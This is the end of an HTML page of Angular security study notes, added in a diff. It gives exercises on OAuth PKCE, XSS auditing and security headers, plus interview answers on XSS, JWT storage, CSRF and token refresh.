+  <div class="video-card"><a href="https://www.youtube.com/watch?v=7Q17ubqLfaM" target="_blank">JWT Authentication — Web Dev Simplified</a><div class="meta">JWT explained simply</div></div>
+  <div class="video-card"><a href="https://www.youtube.com/watch?v=3agP4x8LYFM" target="_blank">CSP Headers — Google Chrome Developers</a><div class="meta">Content Security Policy guide</div></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="exercises">11. Hands-On Exercises</h2>
+
+<div class="exercise">
+  <h4>Exercise 1: Implement Complete Auth Flow</h4>
+  <p><strong>Task:</strong> Build OAuth 2.0 + PKCE flow in Angular:</p>
+  <ul>
+    <li>Login with code challenge generation</li>
+    <li>Token exchange on callback</li>
+    <li>Token refresh interceptor (queue parallel requests)</li>
+    <li>Route guards (auth + role-based)</li>
+    <li>Logout (clear tokens + revoke on server)</li>
+  </ul>
+</div>
+
+<div class="exercise">
+  <h4>Exercise 2: XSS Vulnerability Audit</h4>
+  <p><strong>Task:</strong> Review an Angular app for XSS vulnerabilities:</p>
+  <ul>
+    <li>Find uses of bypassSecurityTrust* — are they justified?</li>
+    <li>Check for direct DOM manipulation (ElementRef.nativeElement)</li>
+    <li>Verify user-generated content is sanitized before rendering</li>
+    <li>Add CSP header that would block inline scripts</li>
+    <li>Test: can you inject script via URL params or form inputs?</li>
+  </ul>
+</div>
+
+<div class="exercise">
+  <h4>Exercise 3: Secure Headers Configuration</h4>
+  <p><strong>Task:</strong> Configure all security headers for production:</p>
+  <ul>
+    <li>Set up strict CSP with nonce-based script loading</li>
+    <li>Configure HSTS with preload</li>
+    <li>Test with securityheaders.com (score A+)</li>
+    <li>Set up CSP report-only for 1 week before enforcing</li>
+  </ul>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="interview-questions">12. Interview Questions (Previously Asked)</h2>
+
+<div class="qa-block">
+  <p class="q">Q1: What is XSS? How does Angular prevent it? Can it still happen? (All companies)</p>
+  <p class="a"><strong>Answer:</strong> XSS = injecting malicious scripts into trusted sites. Three types: Stored (DB), Reflected (URL), DOM-based (client JS). Angular prevents by: auto-escaping interpolation {{ }}, sanitizing innerHTML/href/style bindings, blocking javascript: URLs. Can STILL happen if: (1) using bypassSecurityTrust* incorrectly, (2) direct DOM manipulation via nativeElement, (3) dynamically creating script elements, (4) using third-party libraries that bypass Angular's rendering. Defense-in-depth: also use CSP headers.</p>
+</div>
+
+<div class="qa-block">
+  <p class="q">Q2: Where should you store JWT tokens in a browser? (Amazon, Flipkart, Google)</p>
+  <p class="a"><strong>Answer:</strong> NEVER in localStorage (XSS can read it). Best options: (1) BFF pattern: backend stores tokens in HttpOnly + Secure + SameSite=Strict cookies. Frontend never sees token. (2) In-memory variable for access token (short-lived, lost on refresh) + HttpOnly cookie for refresh token. (3) If using cookies: must add CSRF protection. The BFF pattern is most secure for SPAs because it eliminates token exposure to JavaScript entirely.</p>
+</div>
+
+<div class="qa-block">
+  <p class="q">Q3: Explain OAuth 2.0 Authorization Code flow with PKCE. Why is PKCE needed for SPAs? (All companies)</p>
+  <p class="a"><strong>Answer:</strong> Flow: (1) Generate random code_verifier + SHA256 hash (code_challenge). (2) Redirect to /authorize with code_challenge. (3) User authenticates. (4) Redirect back with auth code. (5) POST /token with code + code_verifier. (6) Server verifies SHA256(code_verifier) matches stored challenge. Why PKCE? SPAs can't keep client_secret (source is public). Without PKCE, attacker intercepting auth code from URL/redirect could exchange it for tokens. With PKCE, only the app that started the flow has the code_verifier needed to complete it.</p>
+</div>
+
+<div class="qa-block">
+  <p class="q">Q4: How do you handle token refresh in Angular? What about concurrent requests? (Microsoft, Amazon)</p>
+  <p class="a"><strong>Answer:</strong> Interceptor catches 401 → calls /refresh endpoint → retries original request with new token. Critical: QUEUE concurrent requests! If 5 requests fail simultaneously, don't send 5 refresh calls. Solution: use a BehaviorSubject to gate retries. First 401 triggers refresh, others wait on the BehaviorSubject. When refresh completes, BehaviorSubject emits new token, all waiting requests retry. If refresh fails: logout user, redirect to login with returnUrl.</p>
+</div>
+
+<div class="qa-block">
+  <p class="q">Q5: What is CSRF and how does Angular handle it? (All companies)</p>
+  <p class="a"><strong>Answer:</strong> CSRF tricks authenticated users into making unintended requests (cookie auto-attached by browser). Angular uses Double-Submit Cookie pattern: (1) Server sets XSRF-TOKEN cookie. (2) HttpClient reads cookie value. (3) Adds X-XSRF-TOKEN header on every mutating request. (4) Server compares cookie to header. Works because: attacker on different origin can't read our cookies (SOP), so can't set the header. Also: use SameSite=Strict cookies as defense-in-depth.</p>
+</div>
+
+<div class="qa-block">
+  <p class="q">Q6: Design the authentication architecture for a large Angular enterprise app. (Senior level)</p>
+  <p class="a"><strong>Answer:</strong> Architecture: (1) OIDC with corporate IdP (Okta/Azure AD) via Authorization Code + PKCE. (2) BFF layer handles token exchange and storage (HttpOnly cookies). (3) Angular guards: functional canActivate for auth + role-based. (4) APP_INITIALIZER checks session on app boot. (5) Interceptor handles 401 → silent refresh → retry queue. (6) Role/permission-based UI: structural directive *hasPermission="'edit'". (7) Idle timeout: warn at 25min, logout at 30min. (8) Multi-tab sync: BroadcastChannel API for logout propagation. (9) CSP + security headers. (10) Audit logging for sensitive actions.</p>
+</div>
+
+<div class="nav-links">
+  <a href="phase4-state-management-data.html">← Phase 4: State & Data</a>
+  <a href="phase6-scalable-ui-architecture.html">Phase 6: Scalable UI →</a>
+</div>
+
+</main>
+</div>
+<script src="fsd-notes-inline.js"></script>
+</body>
+</html>
